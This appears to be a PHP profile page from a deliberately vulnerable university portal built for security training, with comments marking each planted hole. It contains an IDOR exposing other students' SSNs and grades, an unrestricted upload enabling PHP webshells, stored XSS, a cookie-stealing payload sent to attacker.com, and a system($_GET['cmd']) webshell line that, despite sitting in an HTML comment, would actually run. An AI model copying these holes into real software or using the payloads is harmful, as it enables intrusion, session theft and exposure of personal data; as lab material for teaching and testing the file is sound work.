<?php
// public/portal/profile.php
// [VULNERABILITY: A01 - Broken Access Control / IDOR]
// Any authenticated user can view ANY student's profile by changing ?id= in the URL
// e.g., logged in as jsmith (id=1), visit /portal/profile.php?id=2 → see Emily Johnson's full profile

require_once __DIR__ . '/../../src/config/auth.php';
requireLogin();

$db = getDB();

// [VULNERABILITY: A01 - IDOR]
// Should check: if ($profileId !== $_SESSION['user_id'] && $_SESSION['role'] !== 'admin') { deny; }
// Instead: takes any ID from URL parameter with NO authorization check
$profileId = isset($_GET['id']) ? (int)$_GET['id'] : $_SESSION['user_id'];

// Fetch target profile — no ownership check
$stmt = $db->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$profileId]);
$profile = $stmt->fetch(PDO::FETCH_ASSOC);

if (!$profile) {
    http_response_code(404);
    die('<h1>Student not found</h1>');
}

$isOwnProfile = ($profileId === (int)$_SESSION['user_id']);

// Handle profile update
$updateSuccess = '';
$updateError   = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && $isOwnProfile) {

    // [VULNERABILITY: A08 - Software and Data Integrity Failures]
    // File upload with NO content-type validation — allows PHP shell upload
    // Exploit: upload a .php file as "profile photo" → execute at /uploads/shell.php
    if (isset($_FILES['profile_photo']) && $_FILES['profile_photo']['error'] === 0) {
        $uploadDir  = __DIR__ . '/../../uploads/';
        $fileName   = $_FILES['profile_photo']['name']; // [VULNERABILITY: A08] Original filename preserved
        $tmpPath    = $_FILES['profile_photo']['tmp_name'];

        // [VULNERABILITY: A08] ONLY checks file size — no MIME type, no extension allow-list
        if ($_FILES['profile_photo']['size'] > 5 * 1024 * 1024) {
            $updateError = 'File too large (max 5MB).';
        } else {
            // [VULNERABILITY: A08] Dangerous: moves file with original name including .php extension
            move_uploaded_file($tmpPath, $uploadDir . $fileName);
            $db->prepare("UPDATE users SET profile_photo = ? WHERE id = ?")->execute([$fileName, $_SESSION['user_id']]);
            $profile['profile_photo'] = $fileName;
            $updateSuccess = 'Profile photo updated!';
        }
    }

    // [VULNERABILITY: A03 - Stored XSS] bio stored without sanitization
    $bio     = $_POST['bio']   ?? $profile['bio'];
    $phone   = $_POST['phone'] ?? $profile['phone'];
    $address = $_POST['address'] ?? $profile['address'];

    // [VULNERABILITY: A03 - XSS] No htmlspecialchars on input before storing
    $stmt = $db->prepare("UPDATE users SET bio = ?, phone = ?, address = ? WHERE id = ?");
    $stmt->execute([$bio, $phone, $address, $_SESSION['user_id']]);
    $profile['bio'] = $bio;
    $updateSuccess  = $updateSuccess ?: 'Profile updated successfully.';
}

// Fetch grades for this profile
$gradeStmt = $db->prepare("
    SELECT c.code, c.name, e.grade, e.grade_points, e.enrolled_at
    FROM enrollments e JOIN courses c ON e.course_id = c.id
    WHERE e.student_id = ?
    ORDER BY e.enrolled_at DESC
");
$gradeStmt->execute([$profileId]);
$grades = $gradeStmt->fetchAll(PDO::FETCH_ASSOC);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title><?php echo htmlspecialchars($profile['full_name']); ?> | CAU Portal</title>
    <link rel="stylesheet" href="/css/main.css">
    <link rel="stylesheet" href="/css/portal.css">
    <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;700&family=Source+Sans+Pro:wght@300;400;600&display=swap" rel="stylesheet">
</head>
<body class="portal-page">
<?php include __DIR__ . '/../../src/views/partials/portal_nav.php'; ?>

<div class="portal-layout">
    <?php include __DIR__ . '/../../src/views/partials/portal_sidebar.php'; ?>

    <main class="portal-main">

        <?php if (!$isOwnProfile): ?>
        <!-- [VULNERABILITY: A01] Viewing another student's sensitive data — no authorization check prevented this -->
        <div class="alert alert-warning">
            <strong>⚠️ Note:</strong> You are viewing <strong><?php echo htmlspecialchars($profile['full_name']); ?></strong>'s profile.
        </div>
        <?php endif; ?>

        <?php if ($updateSuccess): ?>
        <div class="alert alert-success">✅ <?php echo htmlspecialchars($updateSuccess); ?></div>
        <?php endif; ?>
        <?php if ($updateError): ?>
        <div class="alert alert-error">⚠️ <?php echo htmlspecialchars($updateError); ?></div>
        <?php endif; ?>

        <div class="profile-layout">
            <!-- Profile Card -->
            <aside class="profile-card">
                <div class="profile-avatar">
                    <?php
                    $photo = $profile['profile_photo'] ?? 'default.png';
                    if (file_exists(__DIR__ . '/../../uploads/' . $photo)):
                    ?>
                    <img src="/uploads/<?php echo htmlspecialchars($photo); ?>"
                         alt="Profile photo"
                         onerror="this.style.display='none'">
                    <?php else: ?>
                    <div class="avatar-placeholder">
                        <?php echo strtoupper(substr($profile['full_name'], 0, 2)); ?>
                    </div>
                    <?php endif; ?>
                </div>
                <h2><?php echo htmlspecialchars($profile['full_name']); ?></h2>
                <p class="profile-role"><?php echo ucfirst($profile['role']); ?></p>
                <p class="profile-dept"><?php echo htmlspecialchars($profile['department'] ?? ''); ?></p>
                <div class="profile-badges">
                    <span class="badge">Year <?php echo $profile['year'] ?? 'N/A'; ?></span>
                    <span class="badge">GPA <?php echo $profile['gpa'] ?? 'N/A'; ?></span>
                </div>

                <!-- [VULNERABILITY: A01] Sensitive fields exposed to any authenticated user via IDOR -->
                <div class="profile-details">
                    <div class="profile-detail">
                        <span>📧</span>
                        <a href="mailto:<?php echo htmlspecialchars($profile['email']); ?>">
                            <?php echo htmlspecialchars($profile['email']); ?>
                        </a>
                    </div>
                    <div class="profile-detail">
                        <span>📞</span>
                        <?php echo htmlspecialchars($profile['phone'] ?? 'N/A'); ?>
                    </div>
                    <div class="profile-detail">
                        <span>🪪</span>
                        Student ID: <?php echo htmlspecialchars($profile['student_id']); ?>
                    </div>
                    <?php if (!$isOwnProfile && $_SESSION['role'] !== 'teacher'): ?>
                    <!-- [VULNERABILITY: A01] SSN visible to any student via IDOR — extreme data exposure -->
                    <div class="profile-detail sensitive">
                        <span>⚠️</span>
                        SSN: <?php echo htmlspecialchars($profile['ssn'] ?? 'N/A'); ?>
                    </div>
                    <div class="profile-detail sensitive">
                        <span>🏠</span>
                        <?php echo htmlspecialchars($profile['address'] ?? 'N/A'); ?>
                    </div>
                    <?php endif; ?>
                </div>
            </aside>

            <!-- Main Content -->
            <div class="profile-content">
                <div class="profile-tabs">
                    <button class="tab-btn active" data-tab="bio">About</button>
                    <button class="tab-btn" data-tab="grades">Grades</button>
                    <?php if ($isOwnProfile): ?>
                    <button class="tab-btn" data-tab="edit">Edit Profile</button>
                    <?php endif; ?>
                </div>

                <!-- Bio Tab -->
                <div id="tab-bio" class="tab-content active">
                    <h3>About</h3>
                    <!-- [VULNERABILITY: A03 - Stored XSS] Bio rendered without sanitization -->
                    <!-- Exploit: set bio to <script>document.location='http://attacker.com/?c='+document.cookie</script> -->
                    <div class="bio-text">
                        <?php echo $profile['bio']; // [VULNERABILITY: A03 - Stored XSS] NO htmlspecialchars ?>
                    </div>
                </div>

                <!-- Grades Tab (visible to everyone viewing this profile via IDOR) -->
                <!-- [VULNERABILITY: A01] Any student can see any other student's grades -->
                <div id="tab-grades" class="tab-content">
                    <h3>Academic Record</h3>
                    <table class="data-table">
                        <thead>
                            <tr><th>Course Code</th><th>Course Name</th><th>Grade</th><th>Grade Points</th><th>Enrolled</th></tr>
                        </thead>
                        <tbody>
                        <?php foreach ($grades as $g): ?>
                            <tr>
                                <td><code><?php echo htmlspecialchars($g['code']); ?></code></td>
                                <td><?php echo htmlspecialchars($g['name']); ?></td>
                                <td><span class="grade-badge"><?php echo htmlspecialchars($g['grade'] ?? 'IP'); ?></span></td>
                                <td><?php echo htmlspecialchars($g['grade_points'] ?? '-'); ?></td>
                                <td><?php echo date('M Y', strtotime($g['enrolled_at'])); ?></td>
                            </tr>
                        <?php endforeach; ?>
                        </tbody>
                    </table>
                </div>

                <!-- Edit Profile Tab -->
                <?php if ($isOwnProfile): ?>
                <div id="tab-edit" class="tab-content">
                    <h3>Edit Profile</h3>
                    <form method="POST" enctype="multipart/form-data" class="edit-form">

                        <!-- [VULNERABILITY: A08 - Insecure File Upload] -->
                        <!-- No accept attribute restriction — any file type accepted server-side -->
                        <!-- Upload a PHP webshell: <?php system($_GET['cmd']); ?> saved as shell.php -->
                        <div class="form-group">
                            <label>Profile Photo</label>
                            <p class="form-hint">Upload JPG, PNG, or GIF. (Max 5MB)</p>
                            <!-- Hint says images but server accepts ALL types [VULNERABILITY: A08] -->
                            <input type="file" name="profile_photo" class="file-input">
                        </div>

                        <div class="form-group">
                            <label for="bio">Bio / About Me</label>
                            <!-- [VULNERABILITY: A03 - XSS] No content filtering on bio -->
                            <textarea id="bio" name="bio" rows="5" class="form-textarea"
                                      placeholder="Tell others about yourself..."><?php echo $profile['bio']; ?></textarea>
                        </div>

                        <div class="form-row">
                            <div class="form-group">
                                <label for="phone">Phone Number</label>
                                <input type="text" id="phone" name="phone"
                                       value="<?php echo htmlspecialchars($profile['phone'] ?? ''); ?>"
                                       class="form-input">
                            </div>
                            <div class="form-group">
                                <label for="address">Address</label>
                                <input type="text" id="address" name="address"
                                       value="<?php echo htmlspecialchars($profile['address'] ?? ''); ?>"
                                       class="form-input">
                            </div>
                        </div>

                        <button type="submit" class="btn btn-primary">Save Changes</button>
                    </form>
                </div>
                <?php endif; ?>
            </div>
        </div>

        <!-- Student Directory (helps enumerate IDs for IDOR) -->
        <section class="portal-section">
            <div class="section-head"><h2>Student Directory</h2></div>
            <div class="directory-grid">
            <?php
            // [VULNERABILITY: A01] Full directory exposed to all authenticated users
            $dirStmt = $db->query("SELECT id, full_name, department, year, student_id FROM users WHERE role = 'student'");
            while ($s = $dirStmt->fetch(PDO::FETCH_ASSOC)):
            ?>
                <a href="/portal/profile.php?id=<?php echo $s['id']; ?>" class="directory-card <?php echo $s['id'] == $profileId ? 'active' : ''; ?>">
                    <div class="dir-avatar"><?php echo strtoupper(substr($s['full_name'], 0, 2)); ?></div>
                    <div class="dir-info">
                        <strong><?php echo htmlspecialchars($s['full_name']); ?></strong>
                        <small><?php echo htmlspecialchars($s['department']); ?> · Year <?php echo $s['year']; ?></small>
                        <small><?php echo htmlspecialchars($s['student_id']); ?></small>
                    </div>
                </a>
            <?php endwhile; ?>
            </div>
        </section>

    </main>
</div>
<script src="/js/portal.js"></script>
</body>
</html>
